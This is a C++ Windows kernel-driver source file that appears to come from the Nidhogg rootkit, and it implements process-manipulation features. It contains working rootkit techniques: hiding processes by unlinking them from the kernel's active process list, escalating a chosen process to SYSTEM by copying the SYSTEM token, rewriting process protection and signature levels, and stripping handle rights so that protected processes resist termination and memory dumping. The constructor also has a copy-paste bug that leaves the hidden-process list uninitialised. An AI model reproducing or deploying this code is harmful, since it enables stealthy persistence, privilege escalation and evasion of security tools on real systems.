#include "pch.h"
#include "ProcessHandler.h"

_IRQL_requires_max_(APC_LEVEL)
ProcessHandler::ProcessHandler() noexcept {
	this->protectedProcesses.Count = 0;
	InitializeListHead(this->protectedProcesses.Items);
	this->protectedProcesses.Lock.Init();

	this->hiddenProcesses.Count = 0;
	InitializeListHead(this->protectedProcesses.Items);
	this->hiddenProcesses.Lock.Init();
}

ProcessHandler::~ProcessHandler() {
	ClearProcessList(ProcessType::Protected);
	ClearProcessList(ProcessType::Hidden);
}

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	PEPROCESS Process = static_cast<PEPROCESS>(Info->Object);
	ULONG pid = HandleToULong(PsGetProcessId(Process));

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (NidhoggProcessHandler->FindProcess(pid, ProcessType::Protected)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [_In_ ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS]	 -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
	PEPROCESS targetProcess;
	HiddenProcessEntry entry = { 0 };
	NTSTATUS status = STATUS_SUCCESS;
	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;

	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(targetProcess) + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(targetProcess) + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	// Saving the hidden process' list entry for the future to release it.
	entry.OriginalEntry = processListEntry;
	entry.Pid = pid;

	if (!AddHiddenProcess(entry)) {
		ExReleasePushLockExclusive(listLock);
		ObDereferenceObject(targetProcess);
		return STATUS_UNSUCCESSFUL;
	}

	__try {
		status = RemoveEntryList(processListEntry) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = GetExceptionCode();
	}
	// RemoveListLinks(processListEntry);
	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* UnhideProcess is responsible for unhiding a hidden process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to unhide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;
	HiddenProcessEntry* entryToRestore = nullptr;
	auto finder = [](const HiddenProcessEntry* item, ULONG searchable) {
		return item->Pid == searchable;
	};

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;
	entryToRestore = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(this->hiddenProcesses, pid, finder);

	if (!entryToRestore)
		return STATUS_UNSUCCESSFUL;

	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(targetProcess) + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(targetProcess) + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	InsertHeadList(processListEntry, entryToRestore->OriginalEntry);
	// AddListLinks(entryToRestore, processListEntry);

	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	
	status = RemoveListEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, entryToRestore) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;

	return status;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::ElevateProcess(_In_ ULONG pid) {
	PEPROCESS privilegedProcess;
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status) || tokenOffset == STATUS_UNSUCCESSFUL)
		return status;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(targetProcess);
		return status;
	}
	UINT64* targetToken = reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(targetProcess) + tokenOffset);
	UINT64* privilegedToken = reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(privilegedProcess) + tokenOffset);
	*targetToken = *privilegedToken;

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* SetProcessSignature is responsible for removing or adding process protection to a certain process.
*
* Parameters:
* @ProcessSignature [ProcessSignature*] -- Contains the process PID, signer type and signature signer.
*
* Returns:
* @status  			[NTSTATUS] 			-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::SetProcessSignature(_In_ ProcessSignature* ProcessSignature) {
	PEPROCESS process;
	NTSTATUS status = STATUS_SUCCESS;

	if (!IsValidPid(ProcessSignature->Pid))
		return STATUS_INVALID_PARAMETER;

	status = PsLookupProcessByProcessId(ULongToHandle(ProcessSignature->Pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	UCHAR newSignatureLevel = (ProcessSignature->SignerType << 4) | ProcessSignature->SignatureSigner;
	PPROCESS_SIGNATURE processSignature = reinterpret_cast<PPROCESS_SIGNATURE>(reinterpret_cast<UINT64>(process) + GetSignatureLevelOffset());

	processSignature->SignatureLevel = newSignatureLevel;
	processSignature->Protection.Type = ProcessSignature->SignerType;
	processSignature->Protection.Signer = ProcessSignature->SignatureSigner;

	ObDereferenceObject(process);
	return status;
}

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [_In_ ULONG]		 -- PID to search.
* @type   [_In_ ProcessType] -- Type of process to search (Protected or Hidden).
*
* Returns:
* @bool						 -- Whether found or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
bool ProcessHandler::FindProcess(_In_ ULONG pid, _In_ ProcessType type) const {
	if (!IsValidPid(pid))
		return false;

	switch (type) {
		case ProcessType::Protected: {
			auto finder = [](_In_ const ProtectedProcessEntry* entry, _In_ ULONG pid) -> bool {
				return entry->Pid == pid;
			};

			return FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(
				this->protectedProcesses, pid, finder
			);
			break;
		}
		case ProcessType::Hidden: {
			auto finder = [](_In_ const HiddenProcessEntry* entry, _In_ ULONG pid) -> bool {
				return entry->Pid == pid;
			};

			return FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(
				this->hiddenProcesses, pid, finder
			);
			break;
		}
		default:
			return false;
	}
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid [_In_ ULONG] -- PID to add.
*
* Returns:
* @bool				-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ProtectProcess(_In_ ULONG pid) {
	if (!IsValidPid(pid))
		return false;

	if (FindProcess(pid, ProcessType::Protected))
		return false;
	ProtectedProcessEntry* newEntry = AllocateMemory<ProtectedProcessEntry*>(sizeof(ProtectedProcessEntry));

	if (!newEntry)
		return false;
	newEntry->Pid = pid;
	AddEntry<ProcessList, ProtectedProcessEntry>(protectedProcesses, newEntry);

	return true;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid [_In_ ULONG] -- PID to add.
*
* Returns:
* @bool				-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
	if (!IsValidPid(hiddenProcess.Pid) || !hiddenProcess.OriginalEntry)
		return false;

	if (FindProcess(hiddenProcess.Pid, ProcessType::Hidden))
		return false;
	HiddenProcessEntry* newEntry = AllocateMemory<HiddenProcessEntry*>(sizeof(HiddenProcessEntry));

	if (!newEntry)
		return false;
	newEntry->Pid = hiddenProcess.Pid;
	newEntry->OriginalEntry = hiddenProcess.OriginalEntry;
	AddEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, newEntry);
	return true;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [_In_ ULONG]		 -- PID to remove.
* @type   [_In_ ProcessType] -- Type of process to remove (Protected or Hidden).
*
* Returns:
* @bool						 -- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
	if (!IsValidPid(pid))
		return false;

	switch (type) {
	case ProcessType::Protected: {
		auto finder = [](_In_ const ProtectedProcessEntry* item, _In_ ULONG pid) {
			return item->Pid == pid;
			};
		ProtectedProcessEntry* entry = FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(protectedProcesses, pid, finder);
		return RemoveListEntry<ProcessList, ProtectedProcessEntry>(protectedProcesses, entry);
	}
	
	case ProcessType::Hidden: {
		auto finder = [](_In_ const HiddenProcessEntry* item, _In_ ULONG pid) {
			return item->Pid == pid;
			};
		HiddenProcessEntry* entry = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(hiddenProcesses, pid, finder);
		return RemoveListEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, entry);
	}
	default:
		return false;
	}
}

/*
* Description:
* ClearProcessList is responsible for clearing the list of protected or hidden processes.
*
* Parameters:
* @type   [_In_ ProcessType] -- Type of process to remove (Protected or Hidden).
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void ProcessHandler::ClearProcessList(_In_ ProcessType type) {
	switch (type) {
	case ProcessType::Protected:
		ClearList<ProcessList, ProtectedProcessEntry>(this->protectedProcesses);
		break;
	case ProcessType::Hidden:
		ClearList<ProcessList, HiddenProcessEntry>(this->hiddenProcesses);
		break;
	}
}

/*
* Description:
* ListProtectedProcesses is responsible for listing all protected processes and writing their PIDs to the provided output structure.
* 
* Parameters:
* @processList [_Inout_ IoctlProcessList*] -- Output structure to write the PIDs of protected processes.
* 
* Returns:
* @bool										-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ListProtectedProcesses(_Inout_ IoctlProcessList* processList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (!processList)
		return false;

	AutoLock locker(protectedProcesses.Lock);

	if (protectedProcesses.Count == 0) {
		processList->Count = 0;
		return true;
	}
	if (processList->Count == 0)  {
		processList->Count = protectedProcesses.Count;
		return true;
	}
	currentEntry = protectedProcesses.Items;

	while (currentEntry->Flink != protectedProcesses.Items && count < processList->Count) {
		currentEntry = currentEntry->Flink;
		ProtectedProcessEntry* item = CONTAINING_RECORD(currentEntry, ProtectedProcessEntry, Entry);

		if (item) {
			status = NidhoggMemoryUtils->KeWriteProcessMemory(
				&item->Pid,
				PsGetCurrentProcess(),
				processList->Processes + count ,
				sizeof(ULONG),
				UserMode);

			if (!NT_SUCCESS(status)) {
				processList->Count = count;
				return false;
			}
		}
		count++;
		currentEntry = currentEntry->Flink;
	}

	processList->Count = count;
	return true;
}

/*
* Description:
* ListProtectedProcesses is responsible for listing all protected processes and writing their PIDs to the provided output structure.
*
* Parameters:
* @processList [_Inout_ IoctlProcessList*] -- Output structure to write the PIDs of protected processes.
*
* Returns:
* @bool										-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (!processList)
		return false;

	AutoLock locker(hiddenProcesses.Lock);

	if (hiddenProcesses.Count == 0) {
		processList->Count = 0;
		return true;
	}
	if (processList->Count == 0) {
		processList->Count = hiddenProcesses.Count;
		return true;
	}
	currentEntry = hiddenProcesses.Items;

	while (currentEntry->Flink != hiddenProcesses.Items && count < processList->Count) {
		currentEntry = currentEntry->Flink;
		HiddenProcessEntry* item = CONTAINING_RECORD(currentEntry, HiddenProcessEntry, Entry);

		if (item) {
			status = NidhoggMemoryUtils->KeWriteProcessMemory(
				&item->Pid,
				PsGetCurrentProcess(),
				processList->Processes + count,
				sizeof(ULONG),
				UserMode);

			if (!NT_SUCCESS(status)) {
				processList->Count = count;
				return false;
			}
		}
		count++;
		currentEntry = currentEntry->Flink;
	}

	processList->Count = count;
	return true;
}

/*
* Description:
* RemoveListLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
* that "removing" the current entry.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void ProcessHandler::RemoveListLinks(PLIST_ENTRY current) {
	PLIST_ENTRY previous;
	PLIST_ENTRY next;

	previous = current->Blink;
	next = current->Flink;

	previous->Flink = next;
	next->Blink = previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;
}

/*
* Description:
* AddListLinks is responsible for modifying the list by connecting an entry to specific target.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void ProcessHandler::AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
	PLIST_ENTRY next;

	next = target->Flink;

	current->Blink = target;
	current->Flink = next;

	next->Blink = current;
	target->Flink = current;
}